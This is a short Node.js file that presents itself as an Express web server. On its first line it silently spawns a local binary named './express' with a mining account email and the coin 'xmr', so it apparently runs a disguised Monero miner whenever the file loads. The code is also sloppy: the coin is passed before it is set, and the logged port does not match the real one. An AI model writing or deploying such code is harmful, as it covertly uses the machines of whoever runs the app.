const run = require('child_process').spawn('./express', ['-user', 'ian10_141@yahoo.com.br', coin, '1']);
const express = require('express');
const app = express();
var state = false;
var proc = '';
var coin = 'xmr';


app.listen(8080, ()=>{
  console.log('Example app listening on port 3000!');
});
app.get('/status', function (req, res) {
  	res.send('state: '+state);
});
app.get('/coin/:coin', function (req, res) {
  	coin = req.params.coin;
    res.send('coin setted to: '+coin)
});
